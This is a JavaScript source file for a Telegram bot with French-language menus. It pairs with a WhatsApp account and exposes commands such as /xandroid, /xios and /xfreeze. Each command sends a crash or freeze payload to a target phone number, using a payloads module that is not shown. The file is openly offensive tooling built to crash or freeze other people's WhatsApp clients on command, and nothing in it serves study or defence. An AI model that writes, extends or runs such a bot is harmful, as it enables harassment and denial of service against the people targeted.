const { sendPayload } = require('./payloads');

module.exports.setupCommands = (bot, wa, config) => {
    // Menu
    bot.command('menu', (ctx) => {
        ctx.replyWithMarkdownV2(`
📱 *COMMANDES*

🔗 Appairage : 
/paircode [numéro] *Ex: /paircode 24105114159*

💣 Commandes Spéciales :
/xandroid [cible] - Crash Android
/xios [cible] - Crash iOS
/xfreeze [cible] - Gel WhatsApp
/xbugv1 [cible] - Bug v1
/xbugv2 [cible] - Bug v2
        `);
    });

    // Appairage par numéro
    bot.command('paircode', async (ctx) => {
        const phoneNumber = ctx.message.text.split(' ')[1];
        
        if(!phoneNumber) return ctx.reply('❌ Format: /paircode 24105114159');
        
        const result = await wa.pair(phoneNumber);
        result.status === 'success' 
            ? ctx.reply(`🔑 Code d'appairage : ${result.code}`)
            : ctx.reply(`❌ Erreur: ${result.message}`);
    });

    // Commandes de crash
    const createCrashCmd = (type) => async (ctx) => {
        const target = ctx.message.text.split(' ')[1];
        
        if(!target) return ctx.reply(`❌ Usage: /${type} +numéro`);
        
        try {
            await sendPayload(wa.client, target, type.toUpperCase());
            ctx.reply(`☠️ ${type} envoyé à ${target}`);
        } catch(e) {
            ctx.reply(`💥 Erreur: ${e.message}`);
        }
    };

    config.PREMIUM_CMDS.forEach(cmd => bot.command(cmd, createCrashCmd(cmd)));
};
